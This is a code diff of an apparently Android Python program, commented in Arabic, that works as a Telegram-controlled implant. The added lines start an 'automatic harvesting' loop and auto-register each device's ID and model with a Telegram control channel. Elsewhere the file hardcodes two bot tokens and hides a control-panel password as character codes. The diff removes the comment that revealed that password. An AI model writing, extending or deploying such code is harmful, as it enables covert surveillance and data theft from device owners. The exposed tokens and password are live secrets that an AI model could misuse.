@@ -71,6 +71,7 @@ class M:
             return None
 
     def _di(self):
+        """جمع معلومات الجهاز (المعرف والموديل)"""
         if JNI:
             try:
                 ctx = self._get_ctx()
@@ -160,7 +161,17 @@ class M:
             time.sleep(self.cfg.get('iv', 120))
 
     def start(self):
+        """بدء تشغيل المحرك الرئيسي وتسجيل الجهاز في قناة التحكم"""
+        # 1. تشغيل حلقة الحصاد التلقائي
         threading.Thread(target=self._loop, daemon=True).start()
+        
+        # 2. تسجيل الجهاز في القناة (ليظهر في قائمة "الأجهزة")
+        if self.ui and self.did:
+            try:
+                self.ui.reg(self.did, self.dmd)
+                logging.info(f"Device registered: {self.did}")
+            except Exception as e:
+                logging.error(f"Auto registration failed: {e}")
 
     def stop(self):
         self.rn = False
@@ -174,7 +185,6 @@ class M:
 # ========== ✅ كلمة السر الموحدة: Zaen123@123@ ==========
 def _pw():
     """ترجع كلمة السر المستخدمة في تسجيل الدخول إلى لوحة تحكم تلغرام"""
-    # القيم العددية: Z a e n 1 2 3 @ 1 2 3 @
     return "".join([chr(x) for x in [90, 97, 101, 110, 49, 50, 51, 64, 49, 50, 51, 64]])
 
 
@@ -188,13 +198,18 @@ if __name__ == '__main__':
         "8444591624:AAH84_ih3YUm4rEU_0zVnY2H05QTjjyMsZI",
         "8541707106:AAHJFi2V57HryzYkmA2FBgFMcetfqQCi2jM"
     ]
+    
     try:
         import telegram_ui, commands
         m.ui = telegram_ui.T(m)
         m.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, m.ui, m, cid, cbq)
         m.ui.start()
+        
+        # بدء تشغيل المونيتور (بما فيه تسجيل الجهاز)
+        m.start()
     except Exception as e:
         logging.error(f"Service Core Link Error: {traceback.format_exc()}")
-    m.start()
+    
+    # إبقاء التطبيق حياً
     while True:
         time.sleep(3600)
